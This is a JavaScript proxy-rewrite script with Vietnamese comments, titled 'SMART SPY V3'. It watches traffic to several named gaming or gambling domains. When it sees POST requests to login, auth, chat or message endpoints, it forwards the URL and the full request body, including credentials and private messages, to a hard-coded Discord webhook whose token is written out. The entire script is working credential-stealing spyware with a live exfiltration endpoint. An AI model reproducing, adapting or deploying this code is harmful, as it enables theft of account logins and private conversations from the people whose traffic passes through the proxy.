/**
 * SMART SPY V3 - PHIÊN BẢN ỔN ĐỊNH NHẤT
 * Cơ chế: Chấp nhận mọi kết nối -> Lọc rác bên trong -> Gửi Log
 */

var url = $request.url;
var body = $request.body;
var method = $request.method;

// DANH SÁCH TÊN MIỀN MỤC TIÊU (Chỉ soi đúng bọn này)
// Dựa trên log thành công của bạn: dsrcgoms.net là API chính
var targetDomains = ["dsrcgoms.net", "hit.club", "wsmt8g.cc"];

// 1. KIỂM TRA TÊN MIỀN
// Nếu không phải tên miền Game -> Cho qua ngay (để lướt web, youtube không bị lag)
var isTarget = targetDomains.some(domain => url.includes(domain));

if (!isTarget) {
    $done({});
} 
// 2. LỌC RÁC (Ảnh, Font, CSS, File game)
// Nếu đúng tên miền Game nhưng là file rác -> Cho qua
else if (url.match(/\.(jpeg|jpg|png|gif|webp|svg|css|js|woff|woff2|ttf|mp3|wasm|ico)$/i)) {
    $done({});
}
// 3. BẮT LOGIN (Trọng tâm)
// Nếu là POST và có chữ Login/Auth -> Gửi ngay
else if (method === "POST" && (url.includes("login") || url.includes("auth") || url.includes("collect"))) {
    sendToDiscord("🚨 PHÁT HIỆN ĐĂNG NHẬP", url, body);
    $done({});
}
// 4. BẮT TIN NHẮN (Phụ)
else if (method === "POST" && (url.includes("chat") || url.includes("message"))) {
    sendToDiscord("💬 TIN NHẮN", url, body);
    $done({});
}
// 5. CÁC LINK KHÁC CỦA GAME (API phụ)
// Vẫn log nhưng không gửi body để đỡ spam, chỉ để biết nó đang làm gì
else {
    // Nếu muốn siêu sạch thì xóa dòng sendToDiscord ở dưới đi
    // sendToDiscord("⚠️ API KHÁC", url, "Dữ liệu ẩn để giảm spam"); 
    $done({});
}

function sendToDiscord(title, targetUrl, capturedData) {
    // Thay WEBHOOK CỦA BẠN vào đây
    var discordUrl = "https://discordapp.com/api/webhooks/1454906156777472165/tLAGpqP0YKRK0HjgzhHat-CTb3s6OMiFrPqzse_KZ8NfD16FsgXiNmKbqxyqyaKPX1ST"; 
    
    var data = {
        "username": "HitClub Spy",
        "avatar_url": "https://i.imgur.com/4M34hi2.png",
        "embeds": [{
            "title": title,
            "color": 16711680,
            "fields": [
                { "name": "URL", "value": "`" + targetUrl + "`" },
                { "name": "Data", "value": "```" + capturedData + "```" }
            ],
            "footer": { "text": "Time: " + new Date().toLocaleTimeString() }
        }]
    };

    $task.fetch({
        url: discordUrl,
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
    }, function(error, response, data) {});
}
